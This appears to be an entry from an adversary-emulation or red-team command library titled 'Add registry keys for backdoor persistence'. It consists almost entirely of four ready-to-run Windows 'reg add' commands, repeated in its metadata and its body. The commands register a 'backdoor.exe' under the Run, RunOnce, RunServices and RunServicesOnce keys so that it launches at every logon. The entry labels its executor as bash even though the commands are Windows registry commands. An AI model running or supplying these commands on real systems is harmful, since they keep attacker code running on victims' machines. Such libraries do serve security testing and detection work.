---
id: 0a06374d-2dbe-459b-8941-4ffa8a1b0c87
name: Add registry keys for backdoor persistence
type: command
executor: bash
data: 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v
  Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"

  reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v
  Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"

  reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices"
  /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"

  reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
  /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"'
output: null
created_at: '2023-04-06T03:56:27.769431+00:00'
updated_at: '2023-04-10T20:37:28.586667+00:00'
---

# Add registry keys for backdoor persistence

```bash
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
```


